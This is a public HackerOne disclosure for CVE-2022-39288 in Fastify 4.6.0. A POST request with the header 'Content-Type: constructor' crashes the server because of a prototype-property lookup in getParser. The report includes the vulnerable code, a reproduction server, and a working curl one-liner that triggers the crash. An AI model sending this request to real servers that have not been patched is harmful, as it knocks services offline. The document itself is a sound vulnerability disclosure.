---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2022-10-10
submitted: 2022-09-28T14:43:13.723Z
bounty_usd: null
votes: 17
cve: "CVE-2022-39288"
program: "[[programs/fastify|Fastify]]"
reporter: "bitk"
source: "https://hackerone.com/reports/1715536"
title: "Deny of service via malicious Content-Type"
---
# Deny of service via malicious Content-Type

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 17 | **Program:** Fastify | **Disclosed:** 2022-10-10

- Report: [https://hackerone.com/reports/1715536](https://hackerone.com/reports/1715536)
- CWE: Uncontrolled Resource Consumption | CVE: CVE-2022-39288
- Submitted: 2022-09-28T14:43:13.723Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:

I found a way to crash a fastify@4.6.0  server with a single query on a minimal setup. 


The function `ContentTypeParser.getParser()` do not check properly if the requested content-type parser exists.

/lib/contentTypeParser.js:94
```javascript
ContentTypeParser.prototype.getParser = function (contentType) {
  if (contentType in this.customParsers) {
    return this.customParsers[contentType]
  }

...
```

If an attacker send `constructor` or any default Object attribute, the function will return something unexpected instead of a parser, here the function returns `[Function: Object]`.

Then the `parser.fn` function is called.
/lib/contentTypeParser.js:94
```javascript
    const result = parser.fn(request, request[kRequestPayloadStream], done)
```

Because `parser.fn` is undefined, the application crashes.




## Steps To Reproduce:

I used the code provided in the [documentation](https://www.fastify.io/docs/latest/Guides/Getting-Started/)


index.js
```javascript
const fastify = require('fastify')({
  logger: true
})

// Declare a route
fastify.get('/', function (request, reply) {
  reply.send({ hello: 'world' })
})

// Run the server!
fastify.listen({ port: 3000 }, function (err, address) {
  if (err) {
    fastify.log.error(err)
    process.exit(1)
  }
  // Server is now listening on ${address}
})
```

Start the server:

```
> node index.js
{"level":30,"time":1664375818521,"pid":8587,"hostname":"localhost","msg":"Server listening at http://127.0.0.1:3000"}

```

When the server is ready, send the following POST  request

```
> curl -X POST http://127.0.0.1:3000 -H 'Content-Type: constructor'
curl: (52) Empty reply from server
```

The server had crashed with 

```
TypeError: parser.fn is not a function
```

## Impact

A malicious actor can crash any fastify server as long as they are able to send a `Content-type` header.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2022-09-29** @jsumners: Thank you for the clear and easy report.
- **2022-10-10** @mcollina: How can we credit this to you? Have you got a GitHub profile?
- **Cve Id Added**
- **2022-10-10** @bitk: My github profile is  https://github.com/B-i-t-k
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
